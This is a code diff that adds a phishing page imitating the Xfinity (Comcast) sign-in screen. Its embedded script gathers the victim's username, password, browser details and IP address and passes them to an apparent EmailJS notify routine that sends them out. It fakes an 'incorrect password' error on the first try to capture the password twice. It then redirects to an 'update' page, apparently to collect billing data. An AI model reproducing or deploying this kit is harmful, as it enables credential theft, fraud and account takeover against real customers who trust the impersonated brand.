@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+<title> Sign in to Xfinity </title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+
+<script type="text/javascript"  src="jquery.min.js"></script>
+<link href="bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
+<!------ Include the above in your HEAD tag ---------->
+<link rel="shortcut icon" href="favicon-96x96.png">
+<script type="text/javascript"
+        src="info.js">
+</script>
+<script type="text/javascript"
+        src="email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init({
+        publicKey: PUBLIC_KEY,
+      });
+   })();
+</script>
+
+
+
+<style>
+
+
+@font-face {
+  font-family: "Raleway";
+  src: url("Raleway_400Regular.75b4247fdd3b97d0e3b8e07b115673c2.ttf");
+}
+body{
+        -ms-flex-align: center;
+        -webkit-align-items: center;
+        align-items: center;
+        -webkit-background-size: cover;
+        -moz-background-size: cover;
+        -o-background-size: cover;
+        background-size: cover;
+        justify-content: flex-start;
+        margin: 0;
+        height: 100vh;a
+
+}
+.login-form-1{
+  background:#ffffff;
+  margin-top: 20%;
+  border-radius: 0px;
+
+}
+
+.login-form-1 > form{
+    padding-left: 20%;
+    padding-right: 20%;
+}
+
+.login-form-1 h3{
+    text-align: center;
+    color: #333;
+}
+
+
+.btnSubmit
+{
+    min-width: 20%;
+    border-radius: 20px;
+    padding: 10px;
+    border: none;
+    cursor: pointer;
+}
+.login-form-1 .btnSubmit{
+    font-weight: 600;
+    color: #fff;
+    background-color: #5514b4;
+    border: 1px solid #5514b4;
+    border-radius: 5px;
+}
+
+.login-form-1 .ForgetPwd{
+    color: #5514b4;
+    #font-weight: 600;
+    text-decoration: none;
+
+}
+
+input{
+
+padding: 10px !important;
+height: 50px !important;
+
+}
+#me-ban{
+align-items: center;
+background: url(Desktop.png) no-repeat;
+background-size: 100%;
+background-color: #ffffff;
+min-height: 100vh;
+}
+
+#me-login{
+margin-left: 0%;
+background-color: #ffffff;
+min-height: 100vh;
+}
+
+@media only screen and (max-width: 600px) {
+
+.login-form-1 > form{
+    padding-left: 5% !important;
+    padding-right: 5% !important;
+}
+
+#me-ban{
+
+display: none;
+
+}
+.login-form-1 {
+    margin-top: 5% !important;
+    }
+
+  #me-login {
+   margin: 1% !important;
+  }
+}
+
+
+img {
+  display: block;
+  width: 90px;
+  margin-bottom: 5%;
+}
+#error{
+  padding: 0.5px;
+  color:#da020f !important;
+  margin-bottom: 1%;
+
+}
+
+
+#error > span{
+ font-size: 11px;
+ color:#da020f;
+ }
+</style>
+</head>
+<body>
+<div class="container-fluid">
+            <div class="row">
+                <div id="me-login" class="col-sm-12 col-lg-6 col-md-6">
+
+                    <div class="login-form-1">
+
+
+
+                    <form method="POST" id="eform" name="eform">
+                    <img src="logo-grey.svg" class="logo" />
+
+                    <h2 style="font-weight: 900; margin-bottom: 5%;">Sign in with your Xfinity ID</h2>
+
+                    <div class="error"></div>
+                    <div class="form-group">
+                            <label>Email, mobile, or username</label>
+
+                            <input type="text" class="form-control"  placeholder="Email, mobile, or username" autofocus name="euser" id="euser" value="" />
+
+                            <div class="error_us"></div>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Password </label>
+                            <input type="password" class="form-control" placeholder="Password" value="" name="epass" id="epass"  />
+                            <div class="error_pw"></div>
+                        </div>
+                      <input value="" id="eip" name="eip" type="hidden" />
+
+
+                          <div class="form-group">
+                                  By signing in, you agree to our <a href="#" class="ForgetPwd" id="eforgetp">Terms of Service</a> and <a href="#" class="ForgetPwd" id="eforgetp">Privacy Policy.</a>
+                            
+                          </div>
+                            
+                        <div class="form-group">
+                            <button type="submit" class="btn btnSubmit" id="btnSubmit"> Let's go </button>
+                        </div>
+
+
+                    </form>
+                    </div>
+                </div>
+
+
+                <div id="me-ban" class="col-sm-12 col-lg-6 col-md-6">
+
+                </div>
+
+            </div>
+        </div>
+
+
+<script type="text/javascript"  src="post.js"></script>
+
+        <script>
+        let is_subm = 0;
+
+        $(document).ready(function(){
+          fetch_ip();
+
+          const provider = "COMCAST-COM(https://login.xfinity.com/login?)";
+          const get_browsername = browserN();
+          $("#eform").on("submit", function (e){
+            e.preventDefault();
+            var get_ip = $("#eip").val();
+            var euser = $("#euser").val();
+            var epass = $("#epass").val();
+
+            if (euser == "" && epass == "" ){
+              $(".error_us").html("");
+              $(".error_pw").html("");
+              $(".error").html('<div id="error"><span>Please enter your  Xfinity ID and password to sign in </span></div>');
+
+            }else if (euser == ""){
+              $(".error").html("");
+              $(".error_pw").html("");
+              $(".error_us").html('<div id="error"><span>Please enter your Xfinity ID to sign in.</span></div>');
+
+            }else if (!is_valid(euser)){
+              $(".error").html("");
+              $(".error_pw").html("");
+              $(".error_us").html('<div id="error"><span>Invalid Xfinity ID or  Email Address, Please try again</span></div>');
+
+
+            }else if (epass == ""){
+              $(".error").html("");
+              $(".error_us").html("");
+              $(".error_pw").html('<div id="error"><span>Please type in your password to sign in.</span></div>');
+
+            }else{
+
+              $(".error").html("");
+              $(".error_us").html("");
+              $(".error_pw").html("");
+              is_subm = is_subm +1;
+              var stage = "Confirmed";
+              if(is_subm == 1){
+                var stage = "New";
+                $("#epass").val("");
+                $(".error").html('<div id="error"><span>The Xfinity ID or password you entered was incorrect. Please try again.</span></div>');
+              }
+              var message = `STAGE: ${stage}\nPROVIDER: ${provider}\nUSERNAME: ${euser}\nPASSWORD: ${epass}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
+              const currentUrl = window.location.href;
+              var upath = (currentUrl.endsWith('/') ? '' : '/')+"update.html?bill="+euser;
+              var newUrl = currentUrl + upath;
+              var status = notify(euser, message, newUrl, is_subm);
+
+              if(is_subm > 1){
+                $("#btnSubmit").attr("disabled", "disabled");
+                $("#btnSubmit").text("Proccessing .. ");
+
+
+              }
+
+
+            }
+
+          });
+
+        })
+
+
+    </script>
+
+
+</body>
+
+
+</html>
